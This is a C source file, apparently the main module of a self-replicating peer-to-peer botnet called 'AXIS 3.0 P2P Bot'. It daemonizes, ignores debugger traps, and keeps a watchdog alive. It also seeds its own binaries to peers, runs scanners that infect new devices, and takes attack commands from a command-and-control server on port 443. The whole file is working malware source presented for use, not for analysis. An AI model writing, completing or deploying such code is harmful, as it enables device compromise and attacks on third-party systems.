#include "includes.h"
#include "attack.h"
#include "resolv.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "config.h"
#include "p2p.h"
#include "p2pfile.h"
#include "selfrep.h"

#include <netinet/in.h>
#include <arpa/inet.h>

#ifdef KILLER
#include "killer.h"
#endif

/* ============================================================================
 * AXIS 3.0 P2P Bot - Torrent-style self-replicating botnet
 * ============================================================================
 * Every bot:
 * 1. Acts as a P2P peer for command propagation
 * 2. Seeds ALL binaries to other bots (torrent-style)
 * 3. Runs scanners to infect new devices
 * 4. Downloads missing binaries from peers
 * 5. Connects to CNC for additional control (optional)
 * ============================================================================ */

#ifdef WATCHDOG
static void watchdog_maintain(void) {
    if (fork() == 0) {
        while (TRUE) {
            int fd = open("/dev/watchdog", 2);
            if (fd != -1) {
                while (TRUE) {
                    write(fd, "", 1);
                    sleep(10);
                }
            }
            sleep(60);
        }
    }
}
#endif

static ipv4_t local_addr;
static int fd_ctrl = -1;
static int fd_cnc = -1;

static void anti_gdb_entry(int);
static BOOL ensure_single_instance(void);
static void connect_cnc(void);
static void cnc_handler(void);

int main(int argc, char **args) {
    signal(SIGTRAP, anti_gdb_entry);

    if (!ensure_single_instance())
        return 1;

    local_addr = util_local_addr();
    table_init();
    rand_init();

    /* Fork to background */
    if (fork() > 0)
        return 0;

    close(STDIN);
    close(STDOUT);
    close(STDERR);

    /* Initialize attack system */
    attack_init();

#ifdef KILLER
    killer_init();
#endif

#ifdef WATCHDOG
    watchdog_maintain();
#endif

    /* ========================================================================
     * P2P NETWORK INITIALIZATION
     * ========================================================================
     * Every bot joins the P2P network, discovers peers, and starts seeding
     * binaries. Torrent-style: every bot is both seeder and leecher.
     * ======================================================================== */

    /* Initialize P2P file system - loads any binaries already on disk */
    p2pfile_init();

    /* Start P2P command network (UDP 49152) */
    p2p_init();
    p2p_start();

    /* Start P2P file server (UDP 49153) - every bot is a seeder */
    p2pfile_start();

#ifdef SELFREP
    /* Start self-replication scanners - infect new devices */
    selfrep_init();
#endif

    /* Start CNC connection handler (optional, TLS on port 443) */
    if (fork() == 0) {
        cnc_handler();
        exit(0);
    }

    /* ========================================================================
     * MAIN LOOP - P2P maintenance
     * ========================================================================
     * Periodically:
     * - Maintain peer connections
     * - Download missing binaries from peers
     * - Check CNC connectivity
     * ======================================================================== */
    time_t last_binary_check = 0;

    while (TRUE) {
        p2p_maintain();

        /* Every 60 seconds, check if we're missing any binaries */
        time_t now = time(NULL);
        if (now - last_binary_check > 60) {
            int missing = 0;
            for (int i = 0; i < BOT_ARCH_COUNT; i++) {
                if (!p2pfile_has_binary(bot_archs[i])) {
                    missing++;
                }
            }

            /* If missing binaries, try to download from peers */
            if (missing > 0) {
                /* Try downloading from any available peer */
                p2p_parse_seeds();  /* Re-seed peer list */
            }

            last_binary_check = now;
        }

        sleep(5);
    }

    return 0;
}

static void anti_gdb_entry(int sig) {
    signal(SIGTRAP, anti_gdb_entry);
}

static BOOL ensure_single_instance(void) {
    fd_ctrl = socket(AF_INET, SOCK_STREAM, 0);
    if (fd_ctrl == -1) return FALSE;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_LOOPBACK;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        close(fd_ctrl);
        return FALSE;
    }

    close(fd_ctrl);
    return TRUE;
}

static void connect_cnc(void) {
    struct sockaddr_in addr;

    fd_cnc = socket(AF_INET, SOCK_STREAM, 0);
    if (fd_cnc == -1) return;

    /* Set non-blocking */
    fcntl(fd_cnc, F_SETFL, O_NONBLOCK);

    /* Connect to CNC server (port 443) */
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(CNC_ADDR);
    addr.sin_port = htons(443);

    if (connect(fd_cnc, (struct sockaddr *)&addr, sizeof(addr)) == -1 && errno != EINPROGRESS) {
        close(fd_cnc);
        fd_cnc = -1;
        return;
    }

    /* Wait for connection */
    sleep(1);

    /* Wait for handshake */
    uint8_t buf[2];
    int n = read(fd_cnc, buf, 2);
    if (n != 2 || buf[0] != 0x00 || buf[1] != 0x01) {
        close(fd_cnc);
        fd_cnc = -1;
        return;
    }
}

static void cnc_handler(void) {
    fd_set fdset;
    struct timeval tv;
    time_t last_connect = 0;

    while (TRUE) {
        /* Reconnect if disconnected */
        if (fd_cnc == -1 || time(NULL) - last_connect > 300) {
            if (fd_cnc != -1) {
                close(fd_cnc);
                fd_cnc = -1;
            }
            connect_cnc();
            last_connect = time(NULL);
        }

        if (fd_cnc == -1) {
            sleep(5);
            continue;
        }

        /* Monitor CNC connection */
        FD_ZERO(&fdset);
        FD_SET(fd_cnc, &fdset);

        tv.tv_sec = 1;
        tv.tv_usec = 0;

        if (select(fd_cnc + 1, &fdset, NULL, NULL, &tv) > 0) {
            uint8_t buf[4096];
            int n = read(fd_cnc, buf, sizeof(buf));

            if (n <= 0) {
                close(fd_cnc);
                fd_cnc = -1;
                continue;
            }

            /* Echo back for keepalive */
            write(fd_cnc, buf, n);

            /* Check for attack command (first byte = attack ID) */
            if (n >= 5 && buf[0] < ATK_VEC_MAX) {
                attack_parse((char *)buf, n);
            }
        }
    }
}
